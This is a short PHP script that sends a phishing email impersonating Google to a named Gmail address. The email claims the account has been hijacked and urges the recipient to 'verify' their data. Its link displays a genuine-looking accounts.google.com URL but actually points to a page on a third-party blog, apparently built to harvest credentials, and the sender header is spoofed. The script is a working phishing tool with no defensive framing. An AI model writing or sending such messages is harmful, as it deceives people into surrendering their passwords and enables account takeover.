<?php
$to = "jboro810@gmail.com";

$subject = "URGENT Google Account verification";

$message = "
<html>
<head>
</head>
<body>
Your account - @gmail  has been compromised.
<p>
We have reason to belive that the account may have been hijacked. If you want to get back into your account you need to verify your account information. Click on the link below  
<p>
<h1>URGENT please verify your account data as soon as possible</h1>
<a href=\"http://dtechblog.com/googleauthaccountverify/googleauthverify.html\">https://accounts.google.com/ServiceLogin?hl=en&continue=https://www.google.com/</a>
<p>
Important account security tips:
<br>
- Never give out your password or personal information by email or on social networks.
<br>
- Never use the same password for Google and other websites.
<br>
- Add your mobile phone to your account so you can easily pass Google's security
  measures and make it hard for hijackers to get in.
<p>
Sincerely,
<br>
The G Accounts Team
</body>
</html>
";

// Always set content-type when sending HTML email
$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=iso-8859-1" . "\r\n";

// More headers
$headers .= 'From: <noreply@gmail>' . "\r\n";

// Send Mail
mail($to, $subject, $message, $headers);

// Notify David
echo "You did it!";
?>
